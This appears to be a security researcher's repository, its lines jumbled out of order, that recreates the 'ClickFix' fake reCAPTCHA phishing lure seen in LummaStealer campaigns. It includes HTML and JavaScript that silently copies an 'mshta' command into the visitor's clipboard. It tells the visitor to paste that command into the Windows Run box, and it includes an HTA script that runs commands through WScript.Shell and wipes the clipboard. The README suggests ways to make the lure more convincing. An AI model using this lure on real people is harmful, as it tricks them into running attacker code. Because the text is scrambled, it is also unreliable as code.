 (max - min 
 1) 
 54 
 <b>R</b>.
 <b>V</b>.
 Clears the clipboard so the payload command is removed.
 Other Musings
 Perhaps this could be transformed into an easy Github Pages or Vercel tidbit to readily have a public domain and easy tooling
 Perhaps this could be used within an 
 Recreation
 The Lure In The Wild
 end
 htaPath
 isverifywindowVisible()) {
 min).toString()
 ploy 
 reCAPTCHA Phish
 suffix 
 that the web browser has premptively copied into their clipboard.
 verification_id 
 verifywindow.offsetWidth > window.innerWidth-10 ) {
![Fail to connect](https://github.com/user-attachments/assets/b3e062a5-eb2a-4c43-9b6f-411625e7f740)
![New Steps](https://github.com/user-attachments/assets/2fac92b1-fdff-4a67-883b-b8c1b8ae4aa7)
![Verification Steps](https://github.com/user-attachments/assets/77e9adcb-672e-4a45-845d-58a90ba22935)
![Verify You Are Human](https://github.com/user-attachments/assets/56be51b9-e58d-40e9-bdb1-54bcc11d4180)
![reCAPTCHA](https://github.com/user-attachments/assets/3967e15b-0717-4db4-afa1-62394e47f3b2)
"                            In the verification window, press <b>Ctrl</b> "
"                        To better prove you are not a robot, please:"
"                    <span class=""verify-header-text-big m-p block"">Verification Steps</span>"
"                    <span class=""verify-header-text-medium m-p block""></span>"
"                    <span class=""verify-header-text-medium m-p block"">Complete these</span>"
"                <button type=""button"" class=""verify-verify-button block"" id=""verify-verify-button"" disabled=""true"">Verify</button>"
"                <button type=""button"" id=""checkbox"" class=""checkbox m-p line-normal""></button>"
"                <div class=""verify-footer-left"">"
"                <header class=""verify-header"">"
"                <main class=""verify-main"">"
"                checkboxBtn.addEventListener(""click"", function (event) {"
"                checkboxBtnSpinner.style.visibility = ""hidden"""
"                document.addEventListener(""click"", function (event) {"
"               verifywindow.style.top = ""5px"""
"            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12)"
"            <a href=""https://www.google.com/intl/en/policies/privacy/"">Privacy</a> - <a href=""https://www.google.com/intl/en/policies/terms/"">Terms</a>"
"            <div class=""checkbox-container m-p"">"
"            <div class=""verify-container"">"
"            <footer class=""verify-container verify-footer"">"
"            <img class=""spinner"" alt="""" id=""spinner"">"
"            <img src=""https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"" class=""captcha-logo line-normal"" alt="""">"
"            <p class=""checkbox-desc m-p line-normal"">"
"            <p class=""im-not-a-robot m-p line-normal"">I'm not a robot</p>"
"            border: 2px solid rgba(0, 0, 0, 0.1)"
"            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12)"
"            checkboxBtn.style.borderRadius = ""2px"""
"            checkboxBtn.style.borderRadius = ""50%"""
"            checkboxBtn.style.height = ""100%"""
"            checkboxBtn.style.height = ""4px"""
"            checkboxBtn.style.margin = ""21px 0 0 12px"""
"            checkboxBtn.style.marginLeft = ""25px"""
"            checkboxBtn.style.marginTop = ""33px"""
"            checkboxBtn.style.opacity = ""0"""
"            checkboxBtn.style.opacity = ""1"""
"            checkboxBtn.style.visibility = ""hidden"""
"            checkboxBtn.style.width = ""100%"""
"            checkboxBtn.style.width = ""4px"""
"            checkboxBtnSpinner.style.animation = ""none"""
"            checkboxBtnSpinner.style.animation = ""spin 1s linear infinite"""
"            checkboxBtnSpinner.style.opacity = ""0"""
"            checkboxBtnSpinner.style.opacity = ""1"""
"            checkboxBtnSpinner.style.visibility = ""hidden"""
"            checkboxBtnSpinner.style.visibility = ""visible"""
"            const commandToRun = ""mshta "" "
"            const end = ""''"""
"            const ploy = """
"            const suffix = "" "
"            const tempTextArea = document.createElement(""textarea"")"
"            content: counter(item) "". """
"            document.execCommand(""copy"")"
"            font-family: Roboto, helvetica, arial, sans-serif"
"            return verifywindow.style.display !== ""none"" "
"            stageClipboard(commandToRun, verification_id)"
"            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms"
"            verifywindow.style.display = ""block"""
"            verifywindow.style.display = ""none"""
"            verifywindow.style.opacity = ""0"""
"            verifywindow.style.opacity = ""1"""
"            verifywindow.style.visibility = ""hidden"""
"            verifywindow.style.visibility = ""visible"""
"            }, 500)"
"            },500)"
"            },900)"
"        <a href=""https://www.google.com/intl/en/policies/privacy/"">Privacy</a> - "
"        <a href=""https://www.google.com/intl/en/policies/terms/"">Terms</a>"
"        <div id=""checkbox-window"" class=""checkbox-window m-p block"">"
"        <div id=""verify-window"" class=""verify-window"">"
"        <link rel=""stylesheet"" href=""https://use.fontawesome.com/releases/v5.0.0/css/all.css"">        "
"        <meta charset=""utf-8"">"
"        <p>Verifying reCAPTCHA, please wait...</p>"
"        APPLICATIONNAME=""reCAPTCHA Verification"""
"        BORDER=""thin"""
"        BORDERSTYLE=""normal"""
"        ICON=""https://support.google.com/favicon.ico"""
"        SCROLL=""no"""
"        SCROLLFLAT=""yes"""
"        SHOWINTASKBAR=""yes"""
"        SINGLEINSTANCE=""yes"""
"        SYSMENU=""yes"""
"        Set objHTML = CreateObject(""htmlfile"")"
"        Set objShell = CreateObject(""WScript.Shell"")"
"        WINDOWSTATE=""normal"""
"        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2"
"        Window.ResizeTo 520, 480"
"        document.getElementById(""connecting"").style.display = ""none"""
"        document.getElementById(""error"").style.display = ""block"""
"        function stageClipboard(commandToRun, verification_id){"
"        let checkboxBtn = document.getElementById(""checkbox"")"
"        let checkboxBtnSpinner = document.getElementById(""spinner"")"
"        let checkboxWindow = document.getElementById(""checkbox-window"")"
"        let verifywindow = document.getElementById(""verify-window"")"
"        objHTML.parentWindow.clipboardData.setData ""text"", """""
"        objShell.Run ""calc.exe"", 0, False "
"        objShell.Run ""timeout /T 1 /nobreak"", 0, True"
"        objShell.Run ""timeout /T 2 /nobreak"", 0, True"
"    <div class=""container m-p"">    "
"    <div id=""connecting"" style=""display:block"
"    <div id=""error"" style=""display:none"
"    <img src=""https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"" alt=""reCAPTCHA Logo"">"
"    <p class=""terms"">"
"    <script language=""VBScript"">"
" ""/recaptcha-verify"""
" ""I am not a robot - reCAPTCHA Verification ID: <span id=""verification-id"">146820</span>"""
" ""px"""
" ''I am not a robot - reCAPTCHA Verification ID: """
" Disabled ""Verify"" button to further encourage users to complete the copy-paste steps. "
" Fleshed out phish with the follow-up windows ""failed to verify"""
" Looks and feels like ""real"" reCAPTCHA (_image from the official Google site_)"
" Perhaps this could have a bit more server-side control to check the client's user-agent and do things differently, or adjust the payload appropriately."
" September 13, 2024"
" Validation in the Run box to ""hide"" the command ("
" _""I am not a robot - reCAPTCHA Verification ID: 7624""_)"
" _(Extra callbacks, anybody"
" element, or easily embedded as a widget _anywhere_."
" for an innocent proof of concept of popping open the Windows calculator application. This secondary HTA file would mean it needs to be hosted server-side, or have some other backing infrastructure to offer the payload. "
" function). This can be used as a standalone file and a run any local command, but to get a bit more flexibility with code execution, this repository includes a sample HTA file "
" hold the Windows Key <i class=""fab fa-windows""></i> "
" verifywindow.style.display !== """""
"""Verify you are human"""
", and have them paste in a malicious command with "
", the attack vector being _"
". It includes the CSS and JavaScript in a single file for ease of use, but might need further customization to change the command that is ran (see the JavaScript at the end of the "
"... sure, it probably works. "
"<html lang=""en"">"
"Also, _EdyUkAYshuNaL PoRpoiSes only!!!11_"
"Considering the original is meant to emulate a [reCAPTCHA](https://www.google.com/recaptcha/about/) form, I thought this _""tradecraft""_ (if you dare to call it that) could be improved. "
"Following some chatter on [Twitter](https://x.com/_JohnHammond/status/1834292759320297534), these are apparently called [""ClickFix""](https://x.com/ex_raritas/status/1834399472371016084), or [Emmenhtal](https://x.com/SquiblydooBlog/status/1834292295224475648), used in [LummaStealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.lumma) campaigns observed by [Unit42](https://x.com/Unit42_Intel/status/1829178013423992948), [Orange Cyberdefense](https://www.orangecyberdefense.com/global/blog/cert-news/emmenhtal-a-little-known-loader-distributing-commodity-infostealers-worldwide), [Huntress](https://www.huntress.com/), and others. "
"For quick local testing, I literally just used "
"The HTA file also gives you an opportunity for more convincing charade, too, potentially with a window that pops up to ""try and connect to the reCAPTCHA servers"", but state that it fails and prompt the user to do it all over again. "
----------
-------------
------------------------------
1A73E8
282727
555555
5a89e2
737373
<!DOCTYPE html>
</body>
</head>
</html>
<body>
<head>
<html>
> John Hammond 
> The code is bad because I am a bad programmer.
> [!CAUTION]
Ctrl
Despite this being... 
It literally instructs the user to open the Windows Run dialog box with the hotkey 
Originally seen with the guise 
Really all you need is 
So this recreation has some extra perks:
Some code is reused from https://github.com/75a/fake-captcha
This is small harness to recreate the social engineering and phishing lure recently seen in the wild around August/September 2024.
This repository includes some of my code playing with that idea.
Tonmoy Jitu also wrote a [sweet article](https://denwp.com/anatomy-of-a-lumma-stealer/) covering the original lure. 
Why not make it look as close to the real reCAPTCHA button as possible
_dumb_
b2b2b2
c1c1c1
cecece
copy and paste
d3d3d3
error {
f9f9f9
iframe
index.html
python -m http.server 8000
recaptcha-verify
showVerifyWindow
